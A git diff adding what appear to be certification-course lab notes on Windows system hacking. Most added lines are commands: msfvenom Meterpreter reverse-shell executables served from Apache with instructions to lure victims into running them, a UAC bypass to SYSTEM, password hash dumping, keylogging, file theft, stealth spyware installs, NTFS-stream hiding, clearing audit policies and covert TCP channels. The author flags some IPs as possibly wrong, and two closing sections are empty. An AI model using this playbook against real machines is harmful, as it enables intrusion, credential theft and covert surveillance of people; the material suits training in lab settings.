@@ -74,13 +74,220 @@ Steps to set up a listener:
 5. ``` exploit ```
 
 ### Luring the Victim ###
-Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download the ```reverse-test.exe``` file.
+Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```reverse-test.exe``` file.
 
-### Metasploit ###
+### Metasploit / Meterpreter ###
 If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.
 
 1. ``` run vnc ``` - To start a VNC session with the victim
 2. The victim's Desktop screen will appear
+
+
+- - - -
+
+## Escalating Privileges by Exploiting Client Side Vulnerabilities ##
+
+### msfvenom ###
+``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<Attacker IP> -f exe > <Output Path - Ex. desktop>/exploit.exe ```
+
+### Creating a Directory to Share with the Victim ###
+1. ``` mkdir /var/www/html/share ```
+2. ``` chmod -R 755 /var/www/html/share ```
+3. ``` chown -R www-data:www-data /var/www/html/share ```
+4. ``` mv /root/desktop/exploit.exe /var/www/html/share ``` - Moving the malicious file to the shared folder
+
+### Starting the Apache Server ###
+``` service apache2 start ```
+
+### Metasploit ###
+``` msfconsole ```
+
+1. ``` use exploit/multi/handler ```
+2. ``` set payload windows/meterpreter/reverse_tcp ```
+3. ``` set LHOST <Attacker IP> ```
+4. ``` exploit -j -z ```
+
+### Luring the Victim ###
+Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```exploit.exe``` file.
+
+### Metasploit / Meterpreter ###
+If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.
+
+1. ``` getuid ``` - To check we are logged into the victim machine
+2. ``` run post/windows/gather/smart_hashdump ``` - To dump the password hashes. It might fail due to insufficient privileges
+3. ``` getsystem -t 1 ``` - Tries to escalate privileges by trying to bypass the user account control setting. It uses the 'Service - Name Pipe Impersonation (In Memory/Admin)' technique. It might fail.
+4. ``` background ``` - To set the session on the background
+5. ``` use exploit/windows/local/bypassuac_fodhelper ``` -> ``` show options ``` - Exploit to bypass User Access Controls
+6. ``` set SESSION 1 ``` - Now the exploit has been configured. Now we will configure a payload
+7. ``` set payload windows/meterpreter/reverse_tcp ``` -> ``` show options ```
+8. ``` set LHOST <Attacker IP> ``` , ``` set TARGET 0 ``` - Target 0 is Windows x86
+9. ``` exploit ```
+10. ``` getuid ``` , ``` getsystem ``` - Now it successfully escalates privileges (``` getuid``` -> NT AUTHORITY\SYSTEM)
+11. ``` run post/windows/gather/smart_hashdump ``` - Now it dumps the LM/NTLM password hashes.
+
+
+- - - -
+
+## Hacking Windows 10 using Metasploit and Post-Exploitation using Meterpreter ##
+
+### Creating a File ###
+Creating the file ```secret.txt``` with confidential information: ```My Credit Card account number is 123456789```.
+
+### msfvenom ###
+``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<Attacker IP> -f exe > <Output Path - Ex. desktop>/backdoor.exe ```
+
+### Creating a Directory to Share with the Victim ###
+1. ``` mkdir /var/www/html/share ```
+2. ``` chmod -R 755 /var/www/html/share ```
+3. ``` chown -R www-data:www-data /var/www/html/share ```
+4. ``` mv /root/desktop/backdoor.exe /var/www/html/share ``` - Moving the malicious file to the shared folder
+
+### Starting the Apache Server ###
+``` service apache2 start ```
+
+### Metasploit ###
+``` msfconsole ```
+
+1. ``` use exploit/multi/handler ```
+2. ``` set payload windows/meterpreter/reverse_tcp ```
+3. ``` set LHOST <Attacker IP> ```
+4. ``` show options ```
+5. ``` exploit -j -z ```
+
+### Luring the Victim ###
+Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```backdoor.exe``` file.
+
+### Metasploit / Meterpreter ###
+If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.
+
+1. ``` sysinfo ``` - Information about the system
+2. ``` ipconfig ``` - Networking Interfaces information
+3. ``` getuid ``` - User privilege information
+4. ``` pwd ``` - Current working directory
+5. ``` ls ```
+6. ``` cat secret.txt ``` - The secret file can be read
+7. ``` timestomp secret.txt ``` - To view the MACE (Modified, Access, Created, Entry Modified) Date+Time attributes of the file
+8. ``` download secret.txt ``` - The file is downloaded to the attacker system
+9. ```cd C:\``` -> ``` search -f "filename" ``` - To search for the file in the current directory
+10. ``` keyscan_start ``` - Starts capturing keystrokes on the victim system
+11. ``` keyscan_dump ``` - Dumps the captured keystrokes
+12. ``` idletime ``` - Checks the IDLE time of the machine
+13. ``` shutdown ``` - Shuts down the machine
+
+
+- - - -
+
+## User System Monitoring and Surveillance ##
+
+### Spytech SpyAgent ###
+Connect to the victim via RDP and follow all the steps to install the software. It will run as 'Stealth Mode' (Hidden). If we want to access it: ``` Ctrl+Shift+Alt+M ``` and type the password.
+
+It records a great amount of information, such as keystrokes, programs used, screenshots, mic and webcam..., and organizes it via applications, users, window title...
+
+
+- - - -
+
+## Web Activity Monitoring and Recording ##
+
+### Power Spy ###
+Connect to the victim via RDP and follow all the steps to install the software. Click on 'Start Monitoring' and 'Stealth Mode' to run it on the background. If we want to access it: ``` Ctrl+Alt+X ``` and type the password.
+
+It records a great amount of information, such as keystrokes, clipboard, screenshots, mic, emails..., and organizes it via applications, users, window title...
+
+
+- - - -
+
+## Hiding Files using NTFS Streams ##
+1. ``` type calc.exe > readme.txt:calc.exe ```
+2. ``` mklink backdoor.exe readme.txt:calc.exe ```
+3. ``` backdoor.exe ``` -> Will execute _calc.exe_
+
+
+- - - -
+
+## Hiding Data using White Space Steganography ##
+
+### Snow ###
+Move to the 'Snow' folder in the _cmd_.
+
+1. ``` snow -C -m "My bank account number is 123456789" -p <Password - Ex. "magic"> <Input File> <Output File> ``` - The contents of the output file are the contents of the input file + "My bank acount...". This content is hidden within whitespaces and tabs in the output file.
+2. ``` snow -C -p "magic" <Previous Output File> ``` - It will show the 'secret' contents of the output file
+
+
+- - - - 
+
+## Image Steganography ##
+
+### OpenStego ###
+* Hide Data
+    * Message File -> File with sensitive information
+    * Cover File -> Image where the information is going to be inserted into
+    * Output Stego File -> Select the path and name of the desired output file
+* Extract Data
+    * Input Stego File 
+    * Output Folder for Message File
+
+### Quick Stego ###
+* Hide Data
+  1. Picture, Image, Photo File > Open Image
+  2. Text File > Open Text
+  3. Steganography > Hide Text
+* Extract Data
+  1. Picture, Image, Photo File > Open Image
+  2. Steganography > Get Text
+
+- - - - 
+
+## Viewing, Enabling and Clearing Audit Policies ##
+
+### Auditpol ###
+1. ``` cd C:\Windows\system32 ```
+2. ``` auditpol.exe /get /category:* ``` - To view all Audit Policies
+3. ``` auditpol /set /category:"system","account logon" /success:enable /failure:enable ```- To enable the Audit Policies
+4. ``` auditpol /clear /y ``` - To clear the Audit Policies
+
+
+- - - -
+
+## Covert Channels ##
+
+### Covert_TCP ###
+1. ``` cd desktop ```
+2. ``` mkdir send ```
+3. ``` cd send/ ```
+4. ``` echo "Secret Message" > message.txt ```
+5. Files > + Other Locations > Connect to Server: ``` smb://<Server IP> ```
+6. Navigate to: ```E$\CEHv10 Module 06 System Hacking\Covert_TCP ``` > Right-click _covert_tcp.c_ > Choose: 'Copy'
+7. Paste it into the folder 'send' in the local machine
+8. ```cc -o covert_tcp covert_tcp.c ```
+9. Log into another machine > ``` cd desktop ``` , ``` mkdir receive ```, ``` cd receive ```
+10. Files > + Other Locations > Connect to Server: ``` smb://<Server IP> ```
+11. Navigate to: ```E$\CEHv10 Module 06 System Hacking\Covert_TCP ``` > Right-click _covert_tcp.c_ > Choose: 'Copy'
+12. Paste it into the folder 'receive' in the local machine
+13. ```cc -o covert_tcp covert_tcp.c ```
+14. ``` sudo su ```, ``` ./covert_tcp -dest <IP Dest> -source_port <Port A> -dest_port <Port B> -server -file <Path>/receive/receive.txt ```
+15. Return to the original machine and launch 'Wireshark'
+16. ``` ./covert_tcp -dest <IP Dest> -source <IP Source> -source_port <Port B> -dest_port <Port A> -file <Path>/send/message.txt ```
+
+*Check because I think the IPs are wrong*
+
+- - - -
+
+## Hacking Windows Server 2012 with a Malicious Office Document ##
+
+### TheFatRat ###
+
+
+ - - - -
+ 
+ ## Active Online Attack ##
+ 
+ ### Responder ###
+
+
+
+
+
 
 
 
